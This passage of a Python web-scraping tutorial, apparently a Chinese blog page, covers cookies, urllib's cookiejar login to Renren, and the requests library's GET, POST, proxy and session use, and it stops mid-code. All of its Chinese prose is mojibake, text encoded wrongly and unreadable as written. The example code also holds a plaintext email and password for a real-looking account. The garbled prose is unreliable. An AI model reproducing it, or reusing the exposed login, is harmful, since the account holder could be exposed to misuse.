title="â€œç§‘å­¦ä¸Šç½‘â€ä»£ç†"></a>â€œç§‘å­¦ä¸Šç½‘â€ä»£ç†</h2><p>æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„ä»£ç†ipä»¥åŠå¼€æ”¾çš„ç«¯å£ï¼Œå¼€æ”¾ç«¯å£ç”¨<code>shodan</code>ä¸€èˆ¬å°±å¯ä»¥æœåˆ°ï¼Œä¹Ÿå¯ä»¥ç”¨<code>nmap</code>å»æ‰«æï¼ŒVPNåè®®ç«¯å£æœ‰ä¸‰ç±»ï¼Œç•¥å»</p><h1 id="cookieç›¸å…³ï¼š"><a href="#cookieç›¸å…³ï¼š" class="headerlink" title="cookieç›¸å…³ï¼š"></a>cookieç›¸å…³ï¼š</h1><h2 id="cookieçš„æ ¼å¼ï¼š"><a href="#cookieçš„æ ¼å¼ï¼š" class="headerlink" title="cookieçš„æ ¼å¼ï¼š"></a>cookieçš„æ ¼å¼ï¼š</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: NAME=VALUEï¼›Expires/Max-age=DATEï¼›Path=PATHï¼›Domain=DOMAIN_NAMEï¼›SECURE</span><br></pre></td></tr></table></figure><p>å‚æ•°æ„ä¹‰ï¼š</p><ul><li>NAMEï¼šcookieçš„åå­—ã€‚</li><li>VALUEï¼šcookieçš„å€¼ã€‚</li><li>Expiresï¼šcookieçš„è¿‡æœŸæ—¶é—´ã€‚</li><li>Pathï¼šcookieä½œç”¨çš„è·¯å¾„ã€‚</li><li>Domainï¼šcookieä½œç”¨çš„åŸŸåã€‚</li><li>SECUREï¼šæ˜¯å¦åªåœ¨httpsåè®®ä¸‹èµ·ä½œç”¨ã€‚</li></ul><h2 id="ä½¿ç”¨cookielibåº“å’ŒHTTPCookieProcessoræ¨¡æ‹Ÿç™»å½•ï¼š"><a href="#ä½¿ç”¨cookielibåº“å’ŒHTTPCookieProcessoræ¨¡æ‹Ÿç™»å½•ï¼š" class="headerlink" title="ä½¿ç”¨cookielibåº“å’ŒHTTPCookieProcessoræ¨¡æ‹Ÿç™»å½•ï¼š"></a>ä½¿ç”¨cookielibåº“å’ŒHTTPCookieProcessoræ¨¡æ‹Ÿç™»å½•ï¼š</h2><p>Cookie æ˜¯æŒ‡ç½‘ç«™æœåŠ¡å™¨ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½å’Œè¿›è¡ŒSessionè·Ÿè¸ªï¼Œè€Œå‚¨å­˜åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸Šçš„æ–‡æœ¬æ–‡ä»¶ï¼ŒCookieå¯ä»¥ä¿æŒç™»å½•ä¿¡æ¯åˆ°ç”¨æˆ·ä¸‹æ¬¡ä¸æœåŠ¡å™¨çš„ä¼šè¯ã€‚<br>è¿™é‡Œä»¥äººäººç½‘ä¸ºä¾‹ã€‚äººäººç½‘ä¸­ï¼Œè¦è®¿é—®æŸä¸ªäººçš„ä¸»é¡µï¼Œå¿…é¡»å…ˆç™»å½•æ‰èƒ½è®¿é—®ï¼Œç™»å½•è¯´ç™½äº†å°±æ˜¯è¦æœ‰cookieä¿¡æ¯ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬æƒ³è¦ç”¨ä»£ç çš„æ–¹å¼è®¿é—®ï¼Œå°±å¿…é¡»è¦æœ‰æ­£ç¡®çš„cookieä¿¡æ¯æ‰èƒ½è®¿é—®ã€‚<br>è§£å†³æ–¹æ¡ˆæœ‰ä¸¤ç§ï¼Œç¬¬ä¸€ç§æ˜¯ä½¿ç”¨æµè§ˆå™¨è®¿é—®ï¼Œç„¶åå°†cookieä¿¡æ¯å¤åˆ¶ä¸‹æ¥ï¼Œæ”¾åˆ°headersä¸­ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;ç•¥å»&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://www.renren.com/880151247/profile&#x27;</span></span><br><span class="line"></span><br><span class="line">req = request.Request(url,headers=headers)</span><br><span class="line">resp = request.urlopen(req)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;renren.html&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(resp.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ¯æ¬¡åœ¨è®¿é—®éœ€è¦cookieçš„é¡µé¢éƒ½è¦ä»æµè§ˆå™¨ä¸­å¤åˆ¶cookieæ¯”è¾ƒéº»çƒ¦ã€‚åœ¨Pythonå¤„ç†Cookieï¼Œä¸€èˆ¬æ˜¯é€šè¿‡<code>http.cookiejar</code>æ¨¡å—å’Œ<code>urllibæ¨¡å—çš„HTTPCookieProcessor</code>å¤„ç†å™¨ç±»ä¸€èµ·ä½¿ç”¨ã€‚<code>http.cookiejar</code>æ¨¡å—ä¸»è¦ä½œç”¨æ˜¯æä¾›ç”¨äºå­˜å‚¨cookieçš„å¯¹è±¡ã€‚è€Œ<code>HTTPCookieProcessor</code>å¤„ç†å™¨ä¸»è¦ä½œç”¨æ˜¯å¤„ç†è¿™äº›cookieå¯¹è±¡ï¼Œå¹¶æ„å»ºhandlerå¯¹è±¡ã€‚</p><h2 id="http-cookiejaræ¨¡å—ï¼š"><a href="#http-cookiejaræ¨¡å—ï¼š" class="headerlink" title="http.cookiejaræ¨¡å—ï¼š"></a>http.cookiejaræ¨¡å—ï¼š</h2><p>è¯¥æ¨¡å—ä¸»è¦çš„ç±»æœ‰CookieJarã€FileCookieJarã€MozillaCookieJarã€LWPCookieJarã€‚è¿™å››ä¸ªç±»çš„ä½œç”¨åˆ†åˆ«å¦‚ä¸‹ï¼š  </p><ol><li>CookieJarï¼šç®¡ç†HTTP cookieå€¼ã€å­˜å‚¨HTTPè¯·æ±‚ç”Ÿæˆçš„cookieã€å‘ä¼ å‡ºçš„HTTPè¯·æ±‚æ·»åŠ cookieçš„å¯¹è±¡ã€‚æ•´ä¸ªcookieéƒ½å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œå¯¹CookieJarå®ä¾‹è¿›è¡Œåƒåœ¾å›æ”¶åcookieä¹Ÿå°†ä¸¢å¤±ã€‚  </li><li>FileCookieJar (filename,delayload=None,policy=None)ï¼šä»CookieJaræ´¾ç”Ÿè€Œæ¥ï¼Œç”¨æ¥åˆ›å»ºFileCookieJarå®ä¾‹ï¼Œæ£€ç´¢cookieä¿¡æ¯å¹¶å°†cookieå­˜å‚¨åˆ°æ–‡ä»¶ä¸­ã€‚filenameæ˜¯å­˜å‚¨cookieçš„æ–‡ä»¶åã€‚delayloadä¸ºTrueæ—¶æ”¯æŒå»¶è¿Ÿè®¿é—®è®¿é—®æ–‡ä»¶ï¼Œå³åªæœ‰åœ¨éœ€è¦æ—¶æ‰è¯»å–æ–‡ä»¶æˆ–åœ¨æ–‡ä»¶ä¸­å­˜å‚¨æ•°æ®ã€‚  </li><li>MozillaCookieJar (filename,delayload=None,policy=None)ï¼šä»FileCookieJaræ´¾ç”Ÿè€Œæ¥ï¼Œåˆ›å»ºä¸Mozillaæµè§ˆå™¨ cookies.txtå…¼å®¹çš„FileCookieJarå®ä¾‹ã€‚  </li><li>LWPCookieJar (filename,delayload=None,policy=None)ï¼šä»FileCookieJaræ´¾ç”Ÿè€Œæ¥ï¼Œåˆ›å»ºä¸libwww-perlæ ‡å‡†çš„ Set-Cookie3 æ–‡ä»¶æ ¼å¼å…¼å®¹çš„FileCookieJarå®ä¾‹ã€‚</li></ol><h2 id="ç™»å½•äººäººç½‘ï¼š"><a href="#ç™»å½•äººäººç½‘ï¼š" class="headerlink" title="ç™»å½•äººäººç½‘ï¼š"></a>ç™»å½•äººäººç½‘ï¼š</h2><p>åˆ©ç”¨<code>http.cookiejar</code>å’Œ<code>request.HTTPCookieProcessor</code>ç™»å½•äººäººç½‘ã€‚ç›¸å…³ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼šï¼ˆç»æµ‹è¯•äººäººç½‘å·²ç»ä¸èƒ½è¿™æ ·çˆ¬äº†ï¼Œä»…ä½œä¸€ä¾‹ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"><span class="keyword">from</span> http.cookiejar <span class="keyword">import</span> CookieJar</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_opener</span>():</span></span><br><span class="line">    cookiejar = CookieJar()</span><br><span class="line">    handler = request.HTTPCookieProcessor(cookiejar)</span><br><span class="line">    opener = request.build_opener(handler)</span><br><span class="line">    <span class="keyword">return</span> opener</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_renren</span>(<span class="params">opener</span>):</span></span><br><span class="line">    data = &#123;<span class="string">&quot;email&quot;</span>: <span class="string">&quot;970138074@qq.com&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pythonspider&quot;</span>&#125;</span><br><span class="line">    data = parse.urlencode(data).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    login_url = <span class="string">&quot;http://www.renren.com/PLogin.do&quot;</span></span><br><span class="line">    req = request.Request(login_url, headers=headers, data=data)</span><br><span class="line">    opener.<span class="built_in">open</span>(req)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit_profile</span>(<span class="params">opener</span>):</span></span><br><span class="line">    url = <span class="string">&#x27;http://www.renren.com/880151247/profile&#x27;</span></span><br><span class="line">    req = request.Request(url,headers=headers)</span><br><span class="line">    resp = opener.<span class="built_in">open</span>(req)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;renren.html&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(resp.read().decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    opener = get_opener()</span><br><span class="line">    login_renren(opener)</span><br><span class="line">    visit_profile(opener)//åŒä¸€ä¸ªopenerï¼Œå­˜äº†å…ˆå‰è®¿é—®çš„cookie</span><br></pre></td></tr></table></figure><h2 id="ä¿å­˜cookieåˆ°æœ¬åœ°ï¼š"><a href="#ä¿å­˜cookieåˆ°æœ¬åœ°ï¼š" class="headerlink" title="ä¿å­˜cookieåˆ°æœ¬åœ°ï¼š"></a>ä¿å­˜cookieåˆ°æœ¬åœ°ï¼š</h2><p>ä¿å­˜<code>cookie</code>åˆ°æœ¬åœ°ï¼Œå¯ä»¥ä½¿ç”¨<code>cookiejar</code>çš„<code>save</code>æ–¹æ³•ï¼Œå¹¶ä¸”éœ€è¦æŒ‡å®šä¸€ä¸ªæ–‡ä»¶åï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> http.cookiejar <span class="keyword">import</span> MozillaCookieJar</span><br><span class="line"></span><br><span class="line">cookiejar = MozillaCookieJar(<span class="string">&quot;cookie.txt&quot;</span>)</span><br><span class="line">handler = request.HTTPCookieProcessor(cookiejar)</span><br><span class="line">opener = request.build_opener(handler)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = request.Request(<span class="string">&#x27;http://httpbin.org/cookies&#x27;</span>,headers=headers)</span><br><span class="line"></span><br><span class="line">resp = opener.<span class="built_in">open</span>(req)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br><span class="line">cookiejar.save(ignore_discard=<span class="literal">True</span>,ignore_expires=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="ä»æœ¬åœ°åŠ è½½cookieï¼š"><a href="#ä»æœ¬åœ°åŠ è½½cookieï¼š" class="headerlink" title="ä»æœ¬åœ°åŠ è½½cookieï¼š"></a>ä»æœ¬åœ°åŠ è½½cookieï¼š</h2><p>ä»æœ¬åœ°åŠ è½½<code>cookie</code>ï¼Œéœ€è¦ä½¿ç”¨<code>cookiejar</code>çš„<code>load</code>æ–¹æ³•ï¼Œå¹¶ä¸”ä¹Ÿéœ€è¦æŒ‡å®šæ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> http.cookiejar <span class="keyword">import</span> MozillaCookieJar</span><br><span class="line"></span><br><span class="line">cookiejar = MozillaCookieJar(<span class="string">&quot;cookie.txt&quot;</span>)</span><br><span class="line">cookiejar.load(ignore_expires=<span class="literal">True</span>,ignore_discard=<span class="literal">True</span>)</span><br><span class="line">handler = request.HTTPCookieProcessor(cookiejar)</span><br><span class="line">opener = request.build_opener(handler)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = request.Request(<span class="string">&#x27;http://httpbin.org/cookies&#x27;</span>,headers=headers)</span><br><span class="line"></span><br><span class="line">resp = opener.<span class="built_in">open</span>(req)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><h1 id="requestsåº“"><a href="#requestsåº“" class="headerlink" title="requestsåº“"></a>requestsåº“</h1><p>è™½ç„¶Pythonçš„æ ‡å‡†åº“ä¸­ urllibæ¨¡å—å·²ç»åŒ…å«äº†å¹³å¸¸æˆ‘ä»¬ä½¿ç”¨çš„å¤§å¤šæ•°åŠŸèƒ½ï¼Œä½†æ˜¯å®ƒçš„ API ä½¿ç”¨èµ·æ¥è®©äººæ„Ÿè§‰ä¸å¤ªå¥½ï¼Œè€Œ Requestså®£ä¼ æ˜¯ â€œHTTP for Humansâ€ï¼Œè¯´æ˜ä½¿ç”¨æ›´ç®€æ´æ–¹ä¾¿ã€‚</p><h2 id="å®‰è£…å’Œæ–‡æ¡£åœ°å€ï¼š"><a href="#å®‰è£…å’Œæ–‡æ¡£åœ°å€ï¼š" class="headerlink" title="å®‰è£…å’Œæ–‡æ¡£åœ°å€ï¼š"></a>å®‰è£…å’Œæ–‡æ¡£åœ°å€ï¼š</h2><p>åˆ©ç”¨<code>pip</code>å¯ä»¥éå¸¸æ–¹ä¾¿çš„å®‰è£…ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure><p>ä¸­æ–‡æ–‡æ¡£ï¼š<a href="http://docs.python-requests.org/zh_CN/latest/index.html">http://docs.python-requests.org/zh_CN/latest/index.html</a><br>githubåœ°å€ï¼š<a href="https://github.com/requests/requests">https://github.com/requests/requests</a></p><h2 id="å‘é€GETè¯·æ±‚ï¼š"><a href="#å‘é€GETè¯·æ±‚ï¼š" class="headerlink" title="å‘é€GETè¯·æ±‚ï¼š"></a>å‘é€GETè¯·æ±‚ï¼š</h2><ol><li><p>æœ€ç®€å•çš„å‘é€<code>get</code>è¯·æ±‚å°±æ˜¯é€šè¿‡<code>requests.get</code>æ¥è°ƒç”¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(<span class="string">&quot;http://www.baidu.com/&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>æ·»åŠ headerså’ŒæŸ¥è¯¢å‚æ•°ï¼š<br>å¦‚æœæƒ³æ·»åŠ  headersï¼Œå¯ä»¥ä¼ å…¥headerså‚æ•°æ¥å¢åŠ è¯·æ±‚å¤´ä¸­çš„headersä¿¡æ¯ã€‚å¦‚æœè¦å°†å‚æ•°æ”¾åœ¨urlä¸­ä¼ é€’ï¼Œå¯ä»¥åˆ©ç”¨ params å‚æ•°ã€‚ç›¸å…³ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   </span><br><span class="line">kw = &#123;<span class="string">&#x27;wd&#x27;</span>:<span class="string">&#x27;ä¸­å›½&#x27;</span>&#125;</span><br><span class="line">   </span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;</span>&#125;</span><br><span class="line">   </span><br><span class="line"><span class="comment"># params æ¥æ”¶ä¸€ä¸ªå­—å…¸æˆ–è€…å­—ç¬¦ä¸²çš„æŸ¥è¯¢å‚æ•°ï¼Œå­—å…¸ç±»å‹è‡ªåŠ¨è½¬æ¢ä¸ºurlç¼–ç ï¼Œä¸éœ€è¦urlencode()</span></span><br><span class="line">response = requests.get(<span class="string">&quot;http://www.baidu.com/s&quot;</span>, params = kw, headers = headers)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># æŸ¥çœ‹å“åº”å†…å®¹ï¼Œresponse.text è¿”å›çš„æ˜¯Unicodeæ ¼å¼çš„æ•°æ®</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># æŸ¥çœ‹å“åº”å†…å®¹ï¼Œresponse.contentè¿”å›çš„å­—èŠ‚æµæ•°æ®</span></span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># æŸ¥çœ‹å®Œæ•´urlåœ°å€</span></span><br><span class="line"><span class="built_in">print</span>(response.url)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># æŸ¥çœ‹å“åº”å¤´éƒ¨å­—ç¬¦ç¼–ç </span></span><br><span class="line"><span class="built_in">print</span>(response.encoding)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># æŸ¥çœ‹å“åº”ç </span></span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br></pre></td></tr></table></figure></li></ol><h2 id="å‘é€POSTè¯·æ±‚ï¼š"><a href="#å‘é€POSTè¯·æ±‚ï¼š" class="headerlink" title="å‘é€POSTè¯·æ±‚ï¼š"></a>å‘é€POSTè¯·æ±‚ï¼š</h2><ol><li><p>æœ€åŸºæœ¬çš„POSTè¯·æ±‚å¯ä»¥ä½¿ç”¨<code>post</code>æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.post(<span class="string">&quot;http://www.baidu.com/&quot;</span>,data=data)</span><br></pre></td></tr></table></figure></li><li><p>ä¼ å…¥dataæ•°æ®ï¼š<br>è¿™æ—¶å€™å°±ä¸è¦å†ä½¿ç”¨<code>urlencode</code>è¿›è¡Œç¼–ç äº†ï¼Œç›´æ¥ä¼ å…¥ä¸€ä¸ªå­—å…¸è¿›å»å°±å¯ä»¥äº†ã€‚æ¯”å¦‚è¯·æ±‚æ‹‰å‹¾ç½‘çš„æ•°æ®çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   </span><br><span class="line">url = <span class="string">&quot;https://www.lagou.com/jobs/positionAjax.json?city=%E6%B7%B1%E5%9C%B3&amp;needAddtionalResult=false&amp;isSchoolJob=0&quot;</span></span><br><span class="line">   </span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.lagou.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pn&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;kd&#x27;</span>: <span class="string">&#x27;python&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">resp = requests.post(url,headers=headers,data=data)</span><br><span class="line"><span class="comment"># å¦‚æœæ˜¯jsonæ•°æ®ï¼Œç›´æ¥å¯ä»¥è°ƒç”¨jsonæ–¹æ³•</span></span><br><span class="line"><span class="built_in">print</span>(resp.json())</span><br></pre></td></tr></table></figure></li></ol><h2 id="ä½¿ç”¨ä»£ç†ï¼š"><a href="#ä½¿ç”¨ä»£ç†ï¼š" class="headerlink" title="ä½¿ç”¨ä»£ç†ï¼š"></a>ä½¿ç”¨ä»£ç†ï¼š</h2><p>ä½¿ç”¨<code>requests</code>æ·»åŠ ä»£ç†ä¹Ÿéå¸¸ç®€å•ï¼Œåªè¦åœ¨è¯·æ±‚çš„æ–¹æ³•ä¸­ï¼ˆæ¯”å¦‚<code>get</code>æˆ–è€…<code>post</code>ï¼‰ä¼ é€’<code>proxies</code>å‚æ•°å°±å¯ä»¥äº†ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://httpbin.org/get&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;171.14.209.180:27829&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(url,headers=headers,proxies=proxy)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xx.html&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(resp.text)</span><br></pre></td></tr></table></figure><h2 id="cookieï¼š"><a href="#cookieï¼š" class="headerlink" title="cookieï¼š"></a>cookieï¼š</h2><p>å¦‚æœåœ¨ä¸€ä¸ªå“åº”ä¸­åŒ…å«äº†<code>cookie</code>ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨<code>cookies</code>å±æ€§æ‹¿åˆ°è¿™ä¸ªè¿”å›çš„<code>cookie</code>å€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.renren.com/PLogin.do&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;970138074@qq.com&quot;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;pythonspider&quot;</span>&#125;</span><br><span class="line">resp = requests.get(<span class="string">&#x27;http://www.baidu.com/&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.cookies)</span><br><span class="line"><span class="built_in">print</span>(resp.cookies.get_dict())</span><br></pre></td></tr></table></figure><h2 id="sessionï¼š"><a href="#sessionï¼š" class="headerlink" title="sessionï¼š"></a>sessionï¼š</h2><p>ä¹‹å‰ä½¿ç”¨<code>urllib</code>åº“ï¼Œæ˜¯å¯ä»¥ä½¿ç”¨<code>opener</code>å‘é€å¤šä¸ªè¯·æ±‚ï¼Œå¤šä¸ªè¯·æ±‚ä¹‹é—´æ˜¯å¯ä»¥å…±äº«<code>cookie</code>çš„ã€‚é‚£ä¹ˆå¦‚æœä½¿ç”¨<code>requests</code>ï¼Œä¹Ÿè¦è¾¾åˆ°å…±äº«<code>cookie</code>çš„ç›®çš„ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨<code>requests</code>åº“ç»™æˆ‘ä»¬æä¾›çš„<code>session</code>å¯¹è±¡ã€‚æ³¨æ„ï¼Œè¿™é‡Œçš„<code>session</code>ä¸æ˜¯webå¼€å‘ä¸­çš„é‚£ä¸ªsessionï¼Œè¿™ä¸ªåœ°æ–¹åªæ˜¯ä¸€ä¸ªä¼šè¯çš„å¯¹è±¡è€Œå·²ã€‚è¿˜æ˜¯ä»¥ç™»å½•äººäººç½‘ä¸ºä¾‹ï¼Œä½¿ç”¨<code>requests</code>æ¥å®ç°ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 